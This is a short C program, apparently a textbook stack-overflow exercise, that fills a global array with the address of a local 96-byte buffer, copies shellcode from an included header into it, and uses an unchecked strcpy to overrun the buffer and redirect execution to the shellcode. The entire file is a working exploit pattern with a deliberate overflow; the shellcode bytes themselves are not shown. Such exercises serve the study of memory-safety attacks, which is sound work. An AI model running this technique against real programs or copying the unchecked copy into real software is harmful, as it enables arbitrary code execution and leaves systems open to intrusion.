#include "shellcode.h"

char large_string[128];
int main()
{
	char buffer[96];
	int i;
	int *ptr = (int*) large_string;

	for(i=0;i<32;++i)
		*(ptr + i) = (int) buffer;
	
	for(i=0;i < strlen(shellcode); i++)
		large_string[i] = shellcode[i];

	strcpy(buffer, large_string);

	return 0;
}
